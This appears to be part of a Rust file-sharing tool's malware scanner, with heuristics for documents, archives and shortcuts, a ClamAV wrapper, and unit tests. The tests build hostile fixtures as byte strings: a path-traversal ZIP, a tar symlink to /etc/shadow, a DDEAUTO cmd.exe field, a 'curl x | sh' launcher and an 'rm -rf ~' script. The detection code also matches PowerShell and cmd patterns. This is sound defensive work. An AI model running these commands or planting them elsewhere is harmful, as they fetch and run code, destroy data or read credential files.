        if has(b"/AA") && (has(b"/SubmitForm") || has(b"/URI")) {
            out.push(Finding::new(Severity::Warning, "pdf_auto_action", "PDF con acciones automáticas de formulario/URI"));
        }
        if size as usize > data.len() {
            out.push(Finding::new(Severity::Info, "partial_scan", "PDF grande: analizados los primeros 32 MiB"));
        }
    }

    pub fn check_ole(path: &Path, size: u64, out: &mut Vec<Finding>) {
        let data = read_limited(path, size);
        let utf16 = |s: &str| s.encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<u8>>();
        let has16 = |s: &str| memfind(&data, &utf16(s)).is_some();
        if has16("Macros") || has16("VBA") || has16("_VBA_PROJECT") {
            out.push(Finding::new(Severity::Danger, "office_macro", "documento Office (formato antiguo) con macros VBA"));
        }
        if has16("Ole10Native") || memfind(&data, b"Ole10Native").is_some() {
            out.push(Finding::new(Severity::Danger, "ole_embedded_object", "objeto OLE embebido (Packager): puede contener ejecutables"));
        }
        if memfind(&data, b"DDEAUTO").is_some() || has16("DDEAUTO") {
            out.push(Finding::new(Severity::Danger, "office_dde", "campo DDEAUTO (ejecuta comandos al abrir)"));
        }
    }

    /// The ZIP walk already flags `vbaProject.bin`; add the macro-enabled extension hint.
    pub fn check_ooxml_ext(ext: &str, out: &mut Vec<Finding>) {
        if matches!(ext, "docm" | "xlsm" | "pptm" | "dotm" | "xlam" | "ppam") && !out.iter().any(|f| f.code == "office_macro") {
            out.push(Finding::new(Severity::Warning, "office_macro_ext", "formato Office habilitado para macros"));
        }
    }

    pub fn check_text(path: &Path, size: u64, ext: &str, out: &mut Vec<Finding>) {
        let data = read_limited(path, size.min(4 * 1024 * 1024));
        let lower: Vec<u8> = data.iter().map(|b| b.to_ascii_lowercase()).collect();
        let has = |n: &[u8]| memfind(&lower, n).is_some();
        match ext {
            "svg" | "html" | "htm" | "xhtml" | "xml" | "mht" | "mhtml" => {
                if has(b"<script") || has(b"javascript:") || has(b"onload=") || has(b"onerror=") {
                    let sev = if ext == "svg" { Severity::Danger } else { Severity::Warning };
                    out.push(Finding::new(sev, "html_script", format!("{ext} con script embebido")));
                }
                if has(b"<iframe") || has(b"<object") || has(b"<embed") {
                    out.push(Finding::new(Severity::Warning, "html_embed", "contenido incrustado (iframe/object/embed)"));
                }
                if has(b"http-equiv=\"refresh\"") || has(b"http-equiv='refresh'") {
                    out.push(Finding::new(Severity::Warning, "html_redirect", "redirección automática (meta refresh)"));
                }
            }
            "url" | "desktop" | "webloc" => {
                if has(b"exec=") || has(b"url=file:") || has(b"iconfile=\\\\") {
                    out.push(Finding::new(Severity::Danger, "shortcut_exec", "acceso directo que ejecuta un comando o carga recursos remotos"));
                } else {
                    out.push(Finding::new(Severity::Warning, "shortcut", "archivo de acceso directo"));
                }
            }
            _ => {
                if lower.starts_with(b"#!") || has(b"powershell -enc") || has(b"powershell.exe -e") || has(b"cmd.exe /c") || has(b"iex(") {
                    out.push(Finding::new(Severity::Warning, "script_payload", "texto con contenido de script/comando"));
                }
            }
        }
    }
}

// ───────────────────────── ClamAV ─────────────────────────

pub mod clamav {
    use super::*;
    use std::process::{Command, Stdio};

    /// Find `clamdscan` (daemon, fast) or `clamscan` (loads the DB on each run).
    pub fn locate(explicit: Option<&Path>) -> Option<PathBuf> {
        if let Some(p) = explicit {
            return p.exists().then(|| p.to_path_buf());
        }
        for name in ["clamdscan", "clamscan"] {
            if let Some(p) = which(name) {
                return Some(p);
            }
        }
        for p in [
            r"C:\Program Files\ClamAV\clamdscan.exe",
            r"C:\Program Files\ClamAV\clamscan.exe",
            "/opt/homebrew/bin/clamdscan",
            "/opt/homebrew/bin/clamscan",
            "/usr/local/bin/clamdscan",
            "/usr/local/bin/clamscan",
        ] {
            let p = Path::new(p);
            if p.exists() {
                return Some(p.to_path_buf());
            }
        }
        None
    }

    pub fn is_available() -> bool {
        locate(None).is_some()
    }

    fn which(name: &str) -> Option<PathBuf> {
        let path = std::env::var_os("PATH")?;
        let exts: &[&str] = if cfg!(windows) { &[".exe", ""] } else { &[""] };
        for dir in std::env::split_paths(&path) {
            for e in exts {
                let c = dir.join(format!("{name}{e}"));
                if c.is_file() {
                    return Some(c);
                }
            }
        }
        None
    }

    /// `clamav (clamdscan 1.4.1)` style label.
    pub fn describe(bin: &Path) -> String {
        let name = bin.file_stem().map(|s| s.to_string_lossy().to_string()).unwrap_or_else(|| "clamav".into());
        let ver = Command::new(bin)
            .arg("--version")
            .stdin(Stdio::null())
            .output()
            .ok()
            .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
            .filter(|s| !s.is_empty())
            .map(|s| s.split('/').next().unwrap_or(&s).replace("ClamAV ", ""))
            .unwrap_or_default();
        if ver.is_empty() { format!("clamav ({name})") } else { format!("clamav ({name} {ver})") }
    }

    /// `Ok(Some(signature))` when infected, `Ok(None)` when clean.
    pub fn scan(bin: &Path, file: &Path) -> Result<Option<String>> {
        let is_daemon = bin.file_stem().map(|s| s.to_string_lossy().contains("clamdscan")).unwrap_or(false);
        let mut cmd = Command::new(bin);
        cmd.arg("--no-summary").arg("--infected");
        if is_daemon {
            cmd.arg("--fdpass");
        }
        cmd.arg(file).stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped());
        let mut child = cmd.spawn().with_context(|| format!("running {}", bin.display()))?;
        let start = std::time::Instant::now();
        loop {
            match child.try_wait()? {
                Some(_) => break,
                None if start.elapsed() > CLAMAV_TIMEOUT => {
                    let _ = child.kill();
                    anyhow::bail!("timeout");
                }
                None => std::thread::sleep(Duration::from_millis(50)),
            }
        }
        let out = child.wait_with_output()?;
        let stdout = String::from_utf8_lossy(&out.stdout);
        // exit 0 = clean, 1 = infected, 2 = error
        match out.status.code() {
            Some(0) => Ok(None),
            Some(1) => Ok(Some(
                stdout
                    .lines()
                    .find_map(|l| l.strip_suffix(" FOUND").and_then(|l| l.rsplit(": ").next().map(str::to_string)))
                    .unwrap_or_else(|| "malware detectado".into()),
            )),
            other => anyhow::bail!("exit {:?}: {}", other, String::from_utf8_lossy(&out.stderr).trim()),
        }
    }
}

// ───────────────────────── tests ─────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn codes(fr: &FileReport) -> Vec<&str> {
        fr.findings.iter().map(|f| f.code.as_str()).collect()
    }

    fn write(dir: &Path, name: &str, data: &[u8]) -> PathBuf {
        let p = dir.join(name);
        std::fs::write(&p, data).unwrap();
        p
    }

    /// Minimal stored ZIP: (name, uncompressed_size_declared, flags, payload).
    fn make_zip(entries: &[(&str, u32, u16, &[u8])]) -> Vec<u8> {
        let mut out = Vec::new();
        let mut cd = Vec::new();
        for (name, unc, flags, payload) in entries {
            let off = out.len() as u32;
            let n = name.as_bytes();
            // local header
            out.extend_from_slice(b"PK\x03\x04");
            out.extend_from_slice(&[20, 0]);
            out.extend_from_slice(&flags.to_le_bytes());
            out.extend_from_slice(&[0u8; 6]); // method, time, date
            out.extend_from_slice(&[0u8; 4]); // crc
            out.extend_from_slice(&(payload.len() as u32).to_le_bytes());
            out.extend_from_slice(&unc.to_le_bytes());
            out.extend_from_slice(&(n.len() as u16).to_le_bytes());
            out.extend_from_slice(&0u16.to_le_bytes());
            out.extend_from_slice(n);
            out.extend_from_slice(payload);
            // central directory entry
            cd.extend_from_slice(b"PK\x01\x02");
            cd.extend_from_slice(&[20, 0, 20, 0]);
            cd.extend_from_slice(&flags.to_le_bytes());
            cd.extend_from_slice(&[0u8; 6]); // method, time, date
            cd.extend_from_slice(&[0u8; 4]); // crc
            cd.extend_from_slice(&(payload.len() as u32).to_le_bytes());
            cd.extend_from_slice(&unc.to_le_bytes());
            cd.extend_from_slice(&(n.len() as u16).to_le_bytes());
            cd.extend_from_slice(&0u16.to_le_bytes()); // extra
            cd.extend_from_slice(&0u16.to_le_bytes()); // comment
            cd.extend_from_slice(&[0u8; 8]); // disk, int attr, ext attr
            cd.extend_from_slice(&off.to_le_bytes());
            cd.extend_from_slice(n);
        }
        let cd_off = out.len() as u32;
        out.extend_from_slice(&cd);
        out.extend_from_slice(b"PK\x05\x06");
        out.extend_from_slice(&[0u8; 4]);
        out.extend_from_slice(&(entries.len() as u16).to_le_bytes());
        out.extend_from_slice(&(entries.len() as u16).to_le_bytes());
        out.extend_from_slice(&(cd.len() as u32).to_le_bytes());
        out.extend_from_slice(&cd_off.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out
    }

    fn pe() -> Vec<u8> {
        let mut v = b"MZ".to_vec();
        v.resize(600, 0);
        v
    }

    #[test]
    fn sniffs_common_types() {
        assert_eq!(sniff(b"MZ\x90\x00", &[]), "pe");
        assert_eq!(sniff(b"\x7fELF\x02\x01", &[]), "elf");
        assert_eq!(sniff(b"%PDF-1.7\n", &[]), "pdf");
        assert_eq!(sniff(b"\x89PNG\r\n\x1a\nxxxx", &[]), "png");
        assert_eq!(sniff(b"PK\x03\x04abc", b"[Content_Types].xml"), "ooxml");
        assert_eq!(sniff(b"PK\x03\x04abc", b"META-INF/MANIFEST.MF"), "jar");
        assert_eq!(sniff(b"PK\x03\x04abc", b"classes.dex"), "apk");
        assert_eq!(sniff(b"PK\x03\x04abc", b"nothing"), "zip");
        assert_eq!(sniff(b"#!/bin/sh\necho hi\n", &[]), "script");
        assert_eq!(sniff(b"<?xml version=\"1.0\"?><svg xmlns=\"x\"></svg>", &[]), "svg");
        assert_eq!(sniff(b"<!DOCTYPE html><html></html>", &[]), "html");
        assert_eq!(sniff(b"hola mundo\n", &[]), "text");
        assert_eq!(sniff(b"", &[]), "empty");
        assert_eq!(sniff(&[0u8, 1, 2, 3, 0xff, 0xfe, 0, 0], &[]), "unknown");
        assert_eq!(sniff(b"\x28\xb5\x2f\xfd\x00", &[]), "zstd");
        assert_eq!(sniff(b"L\x00\x00\x00\x01\x14\x02\x00", &[]), "lnk");
        assert_eq!(last_ext("Foto.JPG"), "jpg");
        assert_eq!(last_ext("noext"), "");
        assert_eq!(memfind(b"abcdef", b"cd"), Some(2));
        assert_eq!(memfind(b"abc", b"zz"), None);
    }

    #[test]
    fn disguised_executable_is_danger() {
        let d = tempfile::tempdir().unwrap();
        let p = write(d.path(), "vacaciones.jpg", &pe());
        let r = scan_file(&p, None);
        assert_eq!(r.kind, "pe");
        assert_eq!(r.severity(), Severity::Danger);
        assert!(codes(&r).contains(&"disguised_executable"));
        // plain .exe: only warnings (extension + executable), no disguise
        let p = write(d.path(), "setup.exe", &pe());
        let r = scan_file(&p, None);
        assert_eq!(r.severity(), Severity::Warning);
        assert!(codes(&r).contains(&"executable"));
        assert!(codes(&r).contains(&"dangerous_extension"));
        assert!(!codes(&r).contains(&"disguised_executable"));
        // genuine png is clean
        let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
        png.extend_from_slice(&[0u8; 64]);
        let r = scan_file(&write(d.path(), "ok.png", &png), None);
        assert!(r.is_clean(), "{:?}", r.findings);
        // extension mismatch that is not an executable → warning
        let r = scan_file(&write(d.path(), "foto.png", b"%PDF-1.4\n%%EOF\n"), None);
        assert!(codes(&r).contains(&"magic_mismatch"));
        assert_eq!(r.severity(), Severity::Warning);
    }

    #[test]
    fn name_tricks() {
        let mut out = Vec::new();
        check_name("informe.pdf.exe", &mut out);
        assert!(out.iter().any(|f| f.code == "double_extension" && f.severity == Severity::Danger));
        out.clear();
        check_name("factura\u{202e}fdp.exe", &mut out);
        assert!(out.iter().any(|f| f.code == "rtl_override" && f.severity == Severity::Danger));
        out.clear();
        check_name("archivo\u{200b}.txt", &mut out);
        assert!(out.iter().any(|f| f.code == "zero_width"));
        out.clear();
        check_name("foto.jpg                                   .scr", &mut out);
        assert!(out.iter().any(|f| f.code == "padded_name"));
        out.clear();
        check_name("CON.txt", &mut out);
        assert!(out.iter().any(|f| f.code == "reserved_name"));
        out.clear();
        check_name("script.ps1", &mut out);
        assert!(out.iter().any(|f| f.code == "dangerous_extension"));
        out.clear();
        check_name("notas.txt", &mut out);
        assert!(out.is_empty());
    }

    #[test]
    fn zip_checks() {
        let d = tempfile::tempdir().unwrap();
        // clean
        let z = make_zip(&[("a.txt", 5, 0, b"hello"), ("dir/b.txt", 3, 0, b"abc")]);
        let r = scan_file(&write(d.path(), "ok.zip", &z), None);
        assert!(r.is_clean(), "{:?}", r.findings);
        // bomb: 1 GiB declared from 100 bytes
        let z = make_zip(&[("big.bin", 1 << 30, 0, &[0u8; 100])]);
        let r = scan_file(&write(d.path(), "bomb.zip", &z), None);
        assert!(codes(&r).contains(&"zip_bomb"));
        assert_eq!(r.severity(), Severity::Danger);
        // traversal + executable + nested + encrypted + macros
        let z = make_zip(&[
            ("../../etc/passwd", 4, 0, b"root"),
            ("run.exe", 2, 0, b"MZ"),
            ("inner.zip", 2, 0, b"PK"),
            ("secret.txt", 2, 1, b"xx"),
            ("word/vbaProject.bin", 2, 0, b"xx"),
        ]);
        let r = scan_file(&write(d.path(), "evil.zip", &z), None);
        let c = codes(&r);
        for want in ["zip_traversal", "archive_executable", "nested_archive", "encrypted_entries", "office_macro"] {
            assert!(c.contains(&want), "missing {want} in {c:?}");
        }
        assert_eq!(r.severity(), Severity::Danger);
        // truncated (no EOCD)
        let r = scan_file(&write(d.path(), "trunc.zip", b"PK\x03\x04garbage-without-central-directory"), None);
        assert!(codes(&r).contains(&"zip_truncated"));
        // macro-enabled extension without vbaProject → warning hint; ooxml detection via [Content_Types].xml
        let z = make_zip(&[("[Content_Types].xml", 3, 0, b"<x>"), ("word/document.xml", 3, 0, b"<w>")]);
        let r = scan_file(&write(d.path(), "doc.docm", &z), None);
        assert_eq!(r.kind, "ooxml");
        assert!(codes(&r).contains(&"office_macro_ext"));
        assert!(codes(&r).contains(&"dangerous_extension"));
        let r = scan_file(&write(d.path(), "doc.docx", &z), None);
        assert!(r.is_clean(), "{:?}", r.findings);
    }

    fn make_tar(build: impl FnOnce(&mut tar::Builder<Vec<u8>>)) -> Vec<u8> {
        let mut b = tar::Builder::new(Vec::new());
        build(&mut b);
        b.into_inner().unwrap()
    }

    fn tar_file(b: &mut tar::Builder<Vec<u8>>, path: &str, mode: u32, data: &[u8]) {
        let mut h = tar::Header::new_gnu();
        h.set_size(data.len() as u64);
        h.set_mode(mode);
        h.set_entry_type(tar::EntryType::Regular);
        h.set_cksum();
        b.append_data(&mut h, path, data).unwrap();
    }

    #[test]
    fn tar_checks() {
        let d = tempfile::tempdir().unwrap();
        let t = make_tar(|b| {
            tar_file(b, "docs/readme.txt", 0o644, b"hi");
        });
        let r = scan_file(&write(d.path(), "ok.tar", &t), None);
        assert_eq!(r.kind, "tar");
        assert!(r.is_clean(), "{:?}", r.findings);

        let t = make_tar(|b| {
            tar_file(b, "bin/tool", 0o4755, b"\x7fELF");
            tar_file(b, "x/installer.sh", 0o755, b"#!/bin/sh");
            let mut h = tar::Header::new_gnu();
            h.set_size(0);
            h.set_mode(0o777);
            h.set_entry_type(tar::EntryType::Symlink);
            h.set_cksum();
            b.append_link(&mut h, "link", "/etc/shadow").unwrap();
        });
        let r = scan_file(&write(d.path(), "evil.tar", &t), None);
        let c = codes(&r);
        for want in ["tar_setuid", "archive_executable", "tar_link_escape"] {
            assert!(c.contains(&want), "missing {want} in {c:?}");
        }
        assert_eq!(r.severity(), Severity::Danger);

        // tar.zst goes through the zstd decoder
        let t = make_tar(|b| {
            // tar::Builder refuses `..` in paths, so write the raw name field.
            let mut h = tar::Header::new_gnu();
            let name = b"../escape.txt";
            h.as_mut_bytes()[..name.len()].copy_from_slice(name);
            h.set_size(1);
            h.set_mode(0o644);
            h.set_entry_type(tar::EntryType::Regular);
            h.set_cksum();
            b.append(&h, &b"x"[..]).unwrap();
        });
        let z = zstd::encode_all(&t[..], 3).unwrap();
        let r = scan_file(&write(d.path(), "esc.tar.zst", &z), None);
        assert_eq!(r.kind, "zstd");
        assert!(codes(&r).contains(&"tar_traversal"), "{:?}", r.findings);
    }

    #[test]
    fn document_checks() {
        let d = tempfile::tempdir().unwrap();
        let r = scan_file(&write(d.path(), "js.pdf", b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\n%%EOF"), None);
        assert!(codes(&r).contains(&"pdf_javascript"));
        assert!(!codes(&r).contains(&"pdf_openaction"));
        assert_eq!(r.severity(), Severity::Danger);
        let r = scan_file(&write(d.path(), "launch.pdf", b"%PDF-1.7\n<< /S /Launch /F (cmd.exe) >>\n%%EOF"), None);
        assert!(codes(&r).contains(&"pdf_launch"));
        let r = scan_file(&write(d.path(), "clean.pdf", b"%PDF-1.4\n1 0 obj << /Type /Catalog >>\n%%EOF"), None);
        assert!(r.is_clean(), "{:?}", r.findings);

        // OLE with VBA storage name in UTF-16LE
        let mut ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1".to_vec();
        ole.resize(512, 0);
        ole.extend("_VBA_PROJECT".encode_utf16().flat_map(|c| c.to_le_bytes()));
        ole.extend_from_slice(b"DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe");
        let r = scan_file(&write(d.path(), "old.doc", &ole), None);
        assert!(codes(&r).contains(&"office_macro"));
        assert!(codes(&r).contains(&"office_dde"));

        // SVG with script is danger, html with script only warning
        let r = scan_file(&write(d.path(), "logo.svg", b"<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>"), None);
        assert!(codes(&r).contains(&"html_script"));
        assert_eq!(r.severity(), Severity::Danger);
        let r = scan_file(&write(d.path(), "page.html", b"<!doctype html><html><script>x()</script><iframe src=x></iframe></html>"), None);
        assert!(codes(&r).contains(&"html_script"));
        assert!(codes(&r).contains(&"html_embed"));
        assert_eq!(r.severity(), Severity::Warning);

        // .desktop launcher executing a command
        let r = scan_file(&write(d.path(), "Docs.desktop", b"[Desktop Entry]\nType=Application\nExec=sh -c 'curl x | sh'\n"), None);
        assert!(codes(&r).contains(&"shortcut_exec"));
        assert_eq!(r.severity(), Severity::Danger);

        // shebang script named as text: .txt tolerates scripts, but the shebang is still reported
        let r = scan_file(&write(d.path(), "notas.txt", b"#!/bin/bash\nrm -rf ~\n"), None);
        assert_eq!(r.kind, "script");
        assert!(codes(&r).contains(&"executable"), "{:?}", r.findings);
        assert_eq!(r.severity(), Severity::Warning);
    }

    #[test]
    fn report_and_quarantine() {
        let d = tempfile::tempdir().unwrap();
        let bad = write(d.path(), "foto.jpg", &pe());
        let _ok = write(d.path(), "ok.txt", b"hola\n");
        let sub = d.path().join("sub");
        std::fs::create_dir(&sub).unwrap();
        let bad2 = write(&sub, "readme.pdf.exe", b"MZ\0\0");

        let cfg = ScanConfig { clamav: false, on_danger: DangerAction::Report, ..Default::default() };
        let rep = scan_paths(&[d.path().to_path_buf()], &cfg);
        assert_eq!(rep.files.len(), 3);
        assert_eq!(rep.dangers(), 2);
        assert_eq!(rep.quarantined(), 0);
        assert!(!rep.is_clean());
        assert_eq!(rep.engines, vec!["heuristics".to_string()]);
        assert!(rep.summary().contains("2 peligroso"));
        assert!(rep.detail().contains("disguised_executable"));
        assert!(!rep.detail().contains("ok.txt"));
        assert!(bad.exists() && bad2.exists());

        let cfg = ScanConfig { clamav: false, on_danger: DangerAction::Quarantine, ..Default::default() };
        let rep = scan_paths(std::slice::from_ref(&bad), &cfg);
        assert_eq!(rep.quarantined(), 1);
        assert!(!bad.exists());
        let q = rep.files[0].quarantined.clone().unwrap();
        assert!(q.exists());
        assert!(q.to_string_lossy().ends_with("foto.jpg.unishare-quarantine"));
        // second quarantine of same name gets a numbered suffix
        let bad_again = write(d.path(), "foto.jpg", &pe());
        let q2 = quarantine(&bad_again).unwrap();
        assert_ne!(q, q2);
        assert!(q2.to_string_lossy().contains(".1.unishare-quarantine"));

        let cfg = ScanConfig { clamav: false, on_danger: DangerAction::Delete, ..Default::default() };
        scan_paths(std::slice::from_ref(&bad2), &cfg);
        assert!(!bad2.exists());

        // clean report
        let rep = scan_paths(&[d.path().join("ok.txt")], &cfg);
        assert!(rep.is_clean());
        assert!(rep.summary().contains("sin hallazgos"));
        assert!(rep.detail().is_empty());

        // JSON round-trip (used by `uni-share scan --json` and the GUI)
        let js = serde_json::to_string(&rep).unwrap();
        let back: Report = serde_json::from_str(&js).unwrap();
        assert_eq!(back.files.len(), 1);
    }

    #[test]
    fn size_mismatch_and_clamav_absent_is_info() {
        let d = tempfile::tempdir().unwrap();
        let p = write(d.path(), "data.dat", b"12345");
        let r = scan_file(&p, Some(10));
        assert!(codes(&r).contains(&"size_mismatch"));
        assert_eq!(r.severity(), Severity::Warning);
        let r = scan_file(&p, Some(5));
        assert!(!codes(&r).contains(&"size_mismatch"));
        let r = scan_file(&write(d.path(), "empty.txt", b""), None);
        assert!(codes(&r).contains(&"empty"));
        assert!(r.is_clean());

        // pointing ClamAV to a non-existent binary → engine reports "no instalado", nothing dangerous
        let cfg = ScanConfig { clamav: true, clamav_path: Some(d.path().join("nope/clamscan")), on_danger: DangerAction::Report, ..Default::default() };
        let rep = scan_paths(std::slice::from_ref(&p), &cfg);
        assert!(rep.engines.iter().any(|e| e.contains("no instalado")));
        assert!(rep.is_clean());

        // fake "clamscan" that reports an infection (unix only)
        #[cfg(unix)]
        {
            use std::io::Write;
            use std::os::unix::fs::PermissionsExt;
            let fake = d.path().join("clamscan");
            let mut f = std::fs::File::create(&fake).unwrap();
            f.write_all(b"#!/bin/sh\necho \"$3: Eicar-Test-Signature FOUND\"\nexit 1\n").unwrap();
            drop(f);
            std::fs::set_permissions(&fake, std::fs::Permissions::from_mode(0o755)).unwrap();
            let cfg = ScanConfig { clamav: true, clamav_path: Some(fake), on_danger: DangerAction::Report, ..Default::default() };
            let rep = scan_paths(&[p], &cfg);
            let f = &rep.files[0];
            assert!(f.findings.iter().any(|x| x.code == "clamav" && x.message.contains("Eicar-Test-Signature")), "{:?}", f.findings);
            assert_eq!(rep.dangers(), 1);
        }
    }
}
